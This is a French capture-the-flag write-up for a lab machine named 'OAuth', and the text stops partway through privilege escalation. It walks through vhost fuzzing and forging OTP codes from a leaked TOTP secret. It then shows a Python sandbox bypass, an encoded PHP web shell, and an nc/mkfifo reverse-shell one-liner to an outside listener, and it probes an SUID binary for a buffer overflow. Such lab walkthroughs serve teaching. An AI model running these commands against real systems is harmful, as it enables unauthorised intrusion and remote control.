# WCS - OAuth

Résumé :
  - Analyse de port TCP.
  - Énumération des dossiers et également des VHOSTS et il s'avère que un VHOST `dev`.
  - Exploitation du système `GoogleAuthenticator` et après l'accès avoir un accès sur la platforme `Python`.
  - Fichier atypique qui supporte `SUID` et faire une attaque par buffer overflow avec la technique de la retour à la libc.
  

Commençons par faire un scan de port :

    root@wildcodeschool# nmap -p22,80 -sC -sV 172.30.20.253 --min-rate 10000
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-08 12:29 CET
    Nmap scan report for 172.30.20.253
    Host is up (0.025s latency).

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 2d:60:2a:2a:98:a5:ac:68:3d:a3:64:79:08:6d:81:52 (RSA)
    |   256 3a:e5:20:ac:b7:e4:2e:fc:0a:91:4d:d9:f0:5e:2f:3e (ECDSA)
    |_  256 d4:47:2c:de:36:6a:3f:f6:05:a9:00:9a:26:3e:fa:30 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
    
Il s'avère que le port `22` et `80` est ouvert, donc nous pouvons supposer que le serveur tourne sur `Ubuntu 18.04` en regardant le release des versions.

# HTTP

Lorsque je tape l'adresse IP sur le navigateur et il me redirige automatiquement vers le `VHOST => oauth.wcs`, donc je vais mettre ça dans mon fichier `/etc/hosts`.

    127.0.0.1       localhost
    127.0.1.1       wildcodeschool

    172.30.20.253   oauth.wcs

    # The following lines are desirable for IPv6 capable hosts
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters

Lorsque je tape `oauth.wcs` sur mon navigateur, il me redirige automatiquement vers la page par défaut de `Ubuntu`.

![test](https://raw.githubusercontent.com/0ldProgrammer/0ldProgrammer.github.io/master/Screenshot_2021-02-08_12-36-19.png)

J'ai effectué plusieurs recherches vis à vis des dossiers ou des fichiers, mais `gobuster` n'a strictement rien trouvé. Je vais chercher des `VHOSTS` avec l'outil `wfuzz` et de voir si nous pouvons accéder différement à la machine.

(VHOST est simplement un système qui permet d'avoir plusieurs site sur une même adresse IP)

     root@wildcodeschool# wfuzz -w /usr/share/dnsrecon/subdomains-top1mil-5000.txt -u http://172.30.20.253/ -H "Host: FUZZ.oauth.wcs" --hl 376
     /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://172.30.20.253/
    Total requests: 5000

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                                                                    
    =====================================================================

    000000019:   200        32 L     78 W       1161 Ch     "dev"
    
D'après les scans, l'outil à trouvé le VHOST `dev`, donc je vais en profiter pour mettre ça dans mon fichier `/etc/hosts`.

    root@wildcodeshool: cat /etc/hosts
    127.0.0.1       localhost
    127.0.1.1       oldprogrammer

    172.30.20.253   oauth.wcs dev.oauth.wcs

    # The following lines are desirable for IPv6 capable hosts
    ::1     localhost ip6-localhost ip6-loopback
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    
# dev.oauth.wcs

Une autre page assez intéréssante, j'ai essayé de mettre un code `OTP` mais sans succès, j'ai même esssayé de brute-force de 0 à 1000000, cela n'a pas abouti.

![test](https://raw.githubusercontent.com/0ldProgrammer/0ldProgrammer.github.io/master/Screenshot_2021-02-08_12-45-07.png)

Cherchons des dossiers et ou des fichiers avec `gobuster`.

    root@wildcodeschool# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dev.oauth.wcs/
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://dev.oauth.wcs/
    [+] Threads:        10
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2021/02/08 12:47:21 Starting gobuster
    ===============================================================
    /includes (Status: 301)

Il y a un dossier `/includes` assez intéréssant, lorsque je rentre dedans il y a trois dossiers (css, js, php). Lorsque je rentre dans le dossier `php`, il y a un fichier `access.php.bak` qui pouvait être télécharger par n'importe qui, donc je vais le télécharger et le mettre dans ma machine physique.

![test](https://raw.githubusercontent.com/0ldProgrammer/HTB-SCRIPT/master/Screenshot_2021-02-08_12-50-02.png)

    root@wildcodeschool# wget http://dev.oauth.wcs/includes/php/access.php.bak
    --2021-02-08 12:51:32--  http://dev.oauth.wcs/includes/php/access.php.bak
    Resolving dev.oauth.wcs (dev.oauth.wcs)... 172.30.20.253
    Connecting to dev.oauth.wcs (dev.oauth.wcs)|172.30.20.253|:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 320 [application/x-trash]
    Saving to: ‘access.php.bak’

    access.php.bak                         100%[============================================================================>]     320  --.-KB/s    in 0s      

    2021-02-08 12:51:32 (25.1 MB/s) - ‘access.php.bak’ saved [320/320]
    
Affichons le fichier pour essayer de comprendre le code :

```php
<?php
        require_once 'GoogleAuthenticator.php';
        $ga = new PHPGangsta_GoogleAuthenticator();
        $secret = "P4UJGRUHNI6KNI3O";

        if ($_POST['action'] == 'check_code') {
                $code = $_POST['code'];
                $result = $ga->verifyCode($secret, $code, 1);

                if ($result) {
                        include('coder.php');
                } else {
                        echo "wrong";
                }
        }
?>
```

Les points les plus intéréssants dans le code PHP :

- `require_once 'GoogleAuthenticator.php';` importe le module `GoogleAuthenticator.php` mais n'est pas présent dans mon dossier actuel donc l'exécution ne fonctionnera pas (possible de l'installer depuis [ICI](https://raw.githubusercontent.com/PHPGangsta/GoogleAuthenticator/master/PHPGangsta/GoogleAuthenticator.php).
- `$secret = "P4UJGRUHNI6KNI3O";` est un mot de passe pour la génération d'un code `OTP`, cela nous sera très utile de créer notre propre code et l'envoyer au serveur.
- `$result = $ga->verifyCode($secret, $code, 1);` l'application teste si le code est correcte, si le code est correcte, il redirige vers `coder.php` sinon il affiche une erreur (wrong).

Lorsque nous regardons la documentation de `PHPGangsta`, nous pouvons créer recevoir notre propre code `OTP` à l'aide de la fonction `getCode();` donc créeons notre propre petit script pour récupérer le code.

```php
<?php
  require_once 'GoogleAuthenticator.php';
  $ga = new PHPGangsta_GoogleAuthenticator();
  $secret = "P4UJGRUHNI6KNI3O";
  
  echo $ga->getCode($secret);
  
?>
```

(Un petit point important, l'heure du serveur est décalé de 1 heure, donc si l'heure de votre machine n'est pas adaptée avec lui de la machine cible, le code ne fonctionnera essayer de adapté l'heure)

Et lorsque nous exécutons le code `PHP`, il m'affiche un code que je mettrai dans la platforme et lorsque nous rentrons le code il nous redirige vers une platforme Python.

![test](https://raw.githubusercontent.com/0ldProgrammer/pic/main/Screenshot_2021-02-08_12-07-15.png)

# Reverse Shell TCP

J'ai essayé de faire un `reverse shell` avec le module `os` mais lorsque je tente d'importer le module `os` il me renvoie `Please, don't use malicious code.`. Donc, j'ai réussi à contourner cela en fesant simplement `__import__('os')` et ensuite en appelant le nom de la fonction `system();` donc `__import__('os').system('whoami')`.

![test](https://raw.githubusercontent.com/0ldProgrammer/pic/main/Screenshot_2021-02-08_12-07-15.png)

Donc, j'ai créer un fichier PHP dans le dossier `/var/www/dev/uploads/includes/php/uploads/ex75.php` avec la commande `__import__('os').system('echo UEQ5d2FIQWdaV05vYnlCemVYTjBaVzBvSkY5U1JWRlZSVk5VV3lKamJXUWlYU2s3SUQ4Kw==|base64 -d|base64 -d > /var/www/dev/includes/php/uploads/ex75.php')`

J'ai encodé deux fois pour la simple et bonne raison que il y a des caractères que la platforme accepte pas comme `+`, `/` etc.. Donc j'ai encodé deux fois pour que il me l'écrit dans le dossier `uploads`.

Donc lorsque j'exécute la commande : 

    root@wildcodeschool# curl http://dev.oauth.wcs/includes/php/uploads/ex75.php?cmd=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Donc, nous avons juste à faire un reverse shell avec la commande et aussi de l'`urlencode` :

    root@wildcodeschool# curl http://dev.oauth.wcs/includes/php/uploads/ex75.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20172.11.111.18%204242%20%3E%2Ftmp%2Ff
    
Et en retour nous avons :

    root@wiidcodeschool# nc -lvnp 4242
    listening on [any] 4242 ...
    connect to [172.11.111.18] from (UNKNOWN) [192.168.1.253] 21030
    /bin/sh: 0: can't access tty; job control turned off
    $ python3 -c "import pty;pty.spawn('/bin/bash')"
    www-data@checkpoint04:/var/www/dev/includes/php/uploads$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
   
# Privesc

Lorsque nous cherchons les fichiers `SUID`, nous pouvons voir un fichier atypique qui se nomme `ovrflw`.

    www-data@checkpoint04:/$ find / -perm -4000 -print 2>/dev/null
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/bin/ovrflw <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
    /usr/bin/sudo
    /usr/bin/newgrp
    /usr/bin/traceroute6.iputils
    /usr/bin/chfn
    /usr/bin/passwd
    /usr/bin/chsh
    /usr/bin/gpasswd
    /bin/umount
    /bin/fusermount
    /bin/ntfs-3g
    /bin/mount
    /bin/ping
    /bin/su
    
Si je lui passe des arguments il me renvoie ce que j'ai écris :

    www-data@checkpoint04:/$ /usr/bin/ovrflw aaaaa
    Your name : aaaaa
    
Si je vais essayer de déborder la mémoire en mettant une valeur importante dans l'argument par exemple 500 A.

    www-data@checkpoint04:/$ /usr/bin/ovrflw $(python -c 'print "A"*500')
    Your name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Segmentation fault
    
Il me renvoie bien une Segmentation fault, nous pouvons exploiter cette faille pour pop un shell dans le système, avant de passer à l'exploitation, voyons si l'`ASLR` est activé et les aspects sécurités du programme si par exemple la pile est exécutable.

    www-data@checkpoint04:/$ cat /proc/sys/kernel/randomize_va_space 
    1

Nous pouvons voir que par défaut dans le système la valeur est égal à 1, ce qui veut dire que le système randomisera les adresses mémoires à chaque exécution du programme ce qui nous compliquera la tâche de l'exploitation.

Nous pouvons également voir que la version du programme est un programme en `32-bit` donc les adresses seront plus faciles à cracker.

    www-data@checkpoint04:/$ file /usr/bin/ovrflw 
    /usr/bin/ovrflw: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4fb690fc7b9847b11c5eca9764a919972cc7d8c9, not stripped
    
Regardons si la pile est exécutable :

    www-data@checkpoint04:/$ readelf -l /usr/bin/ovrflw|grep GNU_STACK
      GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
      
Nous pouvons constater que `GNU_STACK` à seulement deux `flags` `R` pour read (lire) et `W` et write pour (écrire), mais il y a pas l'option `E` pour executable pour exécutable.
